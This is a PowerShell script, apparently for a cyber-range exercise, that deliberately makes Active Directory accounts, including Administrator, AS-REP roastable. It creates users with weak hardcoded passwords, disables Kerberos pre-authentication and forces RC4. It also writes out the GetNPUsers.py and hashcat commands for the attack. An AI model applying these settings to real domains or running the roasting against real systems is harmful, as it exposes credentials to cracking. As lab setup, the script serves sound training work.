﻿# vuln: asrep_roasting | severity: high
# Disables Kerberos pre-authentication on AD accounts making them AS-REP roastable
# Attack: GetNPUsers.py cyberstrike.mil/ -usersfile targets.txt -no-pass -dc-ip 10.0.20.101
# Requires: AD DS, Run on ADDC

Write-Host "[VULN] Injecting AS-REP Roasting vulnerability..."

Import-Module ActiveDirectory -ErrorAction Stop

# Accounts to make AS-REP roastable
$targets = @(
    @{ Name = "j.morrison";  Password = "Summer2024!";  Display = "John Morrison" },
    @{ Name = "t.williams";  Password = "Welcome123!";  Display = "Tom Williams" },
    @{ Name = "noauth_svc";  Password = "NoAuth2024!";  Display = "No Auth Service" }
)

foreach ($t in $targets) {
    try {
        # Create user if not exists
        if (-not (Get-ADUser -Filter {SamAccountName -eq $t.Name} -ErrorAction SilentlyContinue)) {
            New-ADUser `
                -Name $t.Display `
                -SamAccountName $t.Name `
                -UserPrincipalName "$($t.Name)@cyberstrike.mil" `
                -AccountPassword (ConvertTo-SecureString $t.Password -AsPlainText -Force) `
                -Enabled $true `
                -PasswordNeverExpires $true
            Write-Host "[+] Created user: $($t.Name)"
        }

        # Disable Kerberos pre-authentication
        Set-ADAccountControl -Identity $t.Name -DoesNotRequirePreAuth $true
        Write-Host "[+] Pre-auth disabled for: $($t.Name) — AS-REP roastable"

        # Force RC4 encryption (makes hash easier to crack)
        Set-ADUser -Identity $t.Name -KerberosEncryptionType RC4

    } catch {
        Write-Host "[!] Failed for $($t.Name): $($_.Exception.Message)"
    }
}

# Also disable pre-auth on Administrator for extra attack surface
try {
    Set-ADAccountControl -Identity "Administrator" -DoesNotRequirePreAuth $true
    Write-Host "[+] Pre-auth disabled for: Administrator"
} catch {
    Write-Host "[!] Could not modify Administrator: $($_.Exception.Message)"
}

# Write target list for blue team scoring
$targetsFile = "C:\Temp\asrep_targets.txt"
New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null
@"
AS-REP Roastable Accounts:
- j.morrison (Summer2024!)
- t.williams (Welcome123!)
- noauth_svc (NoAuth2024!)
- Administrator

Attack command:
GetNPUsers.py cyberstrike.mil/ -usersfile targets.txt -no-pass -dc-ip 10.0.20.101
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
"@ | Out-File $targetsFile -Encoding UTF8

Write-Host "[VULN] AS-REP Roasting injection complete."